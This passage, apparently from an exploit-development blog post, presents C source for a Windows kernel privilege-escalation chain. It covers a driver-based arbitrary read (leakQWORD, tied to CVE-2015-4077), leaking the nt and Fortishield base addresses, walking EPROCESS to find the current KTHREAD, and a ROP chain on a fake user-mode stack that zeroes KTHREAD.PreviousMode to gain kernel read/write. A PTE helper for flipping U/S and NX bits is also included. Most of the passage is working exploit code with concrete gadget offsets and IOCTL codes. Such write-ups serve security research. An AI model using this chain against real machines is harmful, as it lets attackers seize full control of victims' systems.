	<span class="n">LocalFree</span><span class="p">(</span><span class="n">pf_privsource_query_request</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This chunk performs the address leak from CVE-2015-4077 via the leakQWORD() function. This function takes the address you want to read and the handle to the madre driver. It includes the modified leakNtBase() function to find the base address of nt by supplying the handle to the mdare driver and the nt address we pull from our KTHREAD. This uses Morten Schenk’s method of  reading the address at KTHREAD + 0x2a8 which contains the address to nt!EmpCheckErrataList. It then uses the modified scan back technique to locate the nt base address. The leakFortiBase() function is used to leak the base address of Fortishield. It uses the PsLoadModuleList in nt to search through the list and find the module that matches the handle for our fortishield driver.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PULONGLONG</span> <span class="n">leak_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a000000</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
<span class="n">ULONGLONG</span> <span class="nf">leakQWORD</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">addr</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">driver</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">memset</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a000000</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
	<span class="n">memset</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a001000</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
	<span class="n">leak_buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000000001a000008</span><span class="p">;</span>
	<span class="n">leak_buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000003</span><span class="p">;</span>
	<span class="n">leak_buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000000001a000028</span><span class="p">;</span>
	<span class="n">leak_buffer</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x70</span><span class="p">;</span>

	<span class="n">DWORD</span> <span class="n">IoControlCode</span> <span class="o">=</span> <span class="mh">0x22608C</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">InputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a000000</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">InputBufferLength</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">OutputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x000000001a001000</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">OutputBufferLength</span> <span class="o">=</span> <span class="mh">0x110</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">lpBytesReturned</span><span class="p">;</span>

	<span class="n">BOOL</span> <span class="n">triggerIOCTL</span><span class="p">;</span>
	<span class="n">triggerIOCTL</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="n">IoControlCode</span><span class="p">,</span> <span class="n">InputBuffer</span><span class="p">,</span> <span class="n">InputBufferLength</span><span class="p">,</span> <span class="n">OutputBuffer</span><span class="p">,</span> <span class="n">OutputBufferLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">triggerIOCTL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="c1">//printf("[!] Error in the SYSCALL: %d\n", GetLastError());</span>
	<span class="p">}</span>

	<span class="n">ULONGLONG</span> <span class="n">result</span> <span class="o">=</span> <span class="n">leak_buffer</span><span class="p">[</span><span class="mh">0x202</span><span class="p">];</span>
	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">ULONGLONG</span> <span class="nf">leakNtBase</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">kthread</span><span class="p">)</span>
<span class="p">{</span>

	<span class="n">ULONGLONG</span> <span class="n">ntAddr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">kthread</span> <span class="o">+</span> <span class="mh">0x2a8</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">baseAddr</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">signature</span> <span class="o">=</span> <span class="mh">0x00905a4d</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">searchAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">ntAddr</span> <span class="o">-</span> <span class="mh">0x300000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">readData</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
		<span class="n">ULONGLONG</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">readData</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>

		<span class="c1">//printf("%llx\n", readData);</span>
		<span class="c1">//printf("%llx\n", tmp);</span>


		<span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">signature</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">baseAddr</span> <span class="o">=</span> <span class="n">searchAddr</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">searchAddr</span> <span class="o">=</span> <span class="n">searchAddr</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">baseAddr</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">ULONGLONG</span> <span class="nf">leakFortiBase</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">ntBase</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ULONGLONG</span> <span class="n">PsLoadModuleListAddr</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0xc2a310</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">searchAddr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">PsLoadModuleListAddr</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">namePointer</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
		<span class="n">ULONGLONG</span> <span class="n">name</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">namePointer</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">name</span> <span class="o">==</span> <span class="mh">0x00740072006f0046</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">name</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">namePointer</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">name</span> <span class="o">==</span> <span class="mh">0x0069006800530069</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">addr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="n">searchAddr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This chunk allocates the fake stack for the stack pivot and builds the ROP chain. We initially use a ROP gadget mov esp, 0xB60F0020 later in the code when we trigger the CVE-2015-5736 vulnerable IOCTL to pivot the stack to our ROP chain at the user-mode address we allocate in the allocate_fake_stack() function. The ROP chain sets the PreviousMode in our KTHREAD to 0 to enable us to use ReadProcessMemoryand NtWriteVirtualMemory as read and write primitives. As a reminder, this works due to a PreviousMode of zero tricking the kernel in to thinking the parameters passed to ReadProcessMemory and NtWriteVirtualMemory came from a kernel-mode call instead of a user-mode call. This chunk also contains the get_pxe_address_64() function that will return the PTE for the supplied virtual address given the PTE start address we pull later in the code. This allows us to enumerate the PTE for a virtual address to flip bits such as the U/S or NX bits.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PULONGLONG</span> <span class="nf">allocate_fake_stack</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">ntBase</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">fortishield_callback</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">fortishield_restore</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">kThread</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">PULONGLONG</span> <span class="n">fake_stack</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x00000000B60E0000</span><span class="p">,</span> <span class="mh">0x14000</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fake_stack</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while allocating the fake stack: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">fake_stack</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x14000</span><span class="p">);</span>

	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3f01bf</span><span class="p">;</span>		<span class="c1">// pop rax ; pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">fortishield_callback</span><span class="p">;</span>		<span class="c1">// Callback address</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2dd014</span><span class="p">;</span>		<span class="c1">// mov qword [rax], rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3f01bf</span><span class="p">;</span>		<span class="c1">// pop rax ; pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">;</span>			<span class="c1">// KTHREAD.PreviousMode</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x49584f</span><span class="p">;</span>		<span class="c1">// mov byte [rax], cl ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2017d0</span><span class="p">;</span>		<span class="c1">// pop rbx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00000000b60f0110</span><span class="p">;</span>					<span class="c1">// Location on fake_stack</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2017f2</span><span class="p">;</span>		<span class="c1">// pop rax ; ret;</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x217527</span><span class="p">;</span>		<span class="c1">// mov rax, rcx ; add rsp, 0x28 ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3cd671</span><span class="p">;</span>		<span class="c1">// mov rcx, rsi ; call rax</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20de71</span><span class="p">;</span>		<span class="c1">// pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000028</span><span class="p">;</span>					<span class="c1">// Value to subtract to get RSP</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x029db2b</span><span class="p">;</span>		<span class="c1">// sub rax, rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20de71</span><span class="p">;</span>		<span class="c1">// pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">fortishield_restore</span><span class="p">;</span>		<span class="c1">// Restore address</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2dd014</span><span class="p">;</span>		<span class="c1">// mov qword [rax], rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2b82ce</span><span class="p">;</span>		<span class="c1">// mov qword [rbx], rax ; add rsp, 0x20 ; pop rbx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xc8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xd0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xd8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// Restore RBX</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xe8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x201380</span><span class="p">;</span>		<span class="c1">// pop rsp ; ret</span>
	<span class="k">return</span> <span class="n">fake_stack</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">ULONGLONG</span> <span class="nf">get_pxe_address_64</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">address</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">pte_start</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ULONGLONG</span> <span class="n">result</span> <span class="o">=</span> <span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">9</span><span class="p">;</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">|</span> <span class="n">pte_start</span><span class="p">;</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pte_start</span> <span class="o">+</span> <span class="mh">0x0000007ffffffff8</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This is the walkEprocess() function I added to walk the EPROCESS address leaked from CVE-2021-31955 to return the KTHREAD. It takes a handle to the mdare driver to enable the leak of the QWORDs at various addresses and the EPROCESS address you wish to walk to find the KTHREAD.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="nf">walkEprocess</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">eProcess</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">currentTid</span> <span class="o">=</span> <span class="n">GetCurrentThreadId</span><span class="p">();</span>

	<span class="n">ULONGLONG</span> <span class="n">listHead</span> <span class="o">=</span> <span class="n">eProcess</span> <span class="o">+</span> <span class="n">EPROCESS_ThreadListHead_Offset</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">flink</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">listHead</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">flink</span> <span class="o">!=</span> <span class="n">listHead</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">ethread</span> <span class="o">=</span> <span class="n">flink</span> <span class="o">-</span> <span class="n">ETHREAD_ThreadListEntry_Offset</span><span class="p">;</span>

		<span class="n">ULONGLONG</span> <span class="n">uniqueTid</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">ethread</span> <span class="o">+</span> <span class="n">ETHREAD_Cid_Offset</span> <span class="o">+</span> <span class="n">CLIENTID_UniqueThread_Offset</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">uniqueTid</span> <span class="o">==</span> <span class="n">currentTid</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ULONGLONG</span> <span class="n">kthread</span> <span class="o">=</span> <span class="n">ethread</span><span class="p">;</span>  <span class="c1">// Tcb is at offset 0x0</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Found current thread:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] ETHREAD: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ethread</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] KTHREAD: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kthread</span><span class="p">);</span>
			<span class="k">return</span> <span class="n">kthread</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">flink</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">flink</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>  <span class="c1">// Move to next thread</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Current thread not found in EPROCESS thread list.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
